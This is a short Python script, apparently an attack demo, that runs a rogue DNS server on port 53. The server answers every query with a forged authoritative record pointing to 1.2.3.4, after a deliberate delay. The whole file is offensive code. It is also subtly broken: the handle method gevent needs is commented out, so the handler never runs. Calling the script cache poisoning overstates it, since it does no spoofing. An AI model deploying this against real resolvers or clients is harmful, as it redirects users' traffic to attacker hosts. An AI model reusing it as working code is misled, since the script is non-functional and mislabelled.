#!/usr/bin/env python3

"""
A DNS cache poisoning attacker demo
"""


from time import sleep
import dnslib
from gevent.server import DatagramServer

ALWAYS_RESPOND_IP = "1.2.3.4"


class DNSServer(DatagramServer):
    """ This is the DNS server """

    def handle_dns_request(self, data, address):
        """ This actually handles DNS requests """

        req = dnslib.DNSRecord.parse(data)
        qname = str(req.q.qname)
        qid = req.header.id

        response = dnslib.DNSRecord(
            dnslib.DNSHeader(qr=1, aa=1, ra=1),
            q=dnslib.DNSQuestion(qname),
            a=dnslib.RR(qname, rdata=dnslib.A(ALWAYS_RESPOND_IP))
        )

        response.header.id = qid
        sleep(1.5)
        self.socket.sendto(response.pack(), address)

    # def handle(self, data, address):
    #     """ handle of generic requests """
    #     self.handle_dns_request(data, address)


def main():
    """ main entry point """
    DNSServer(":53").serve_forever()


if __name__ == "__main__":
    main()
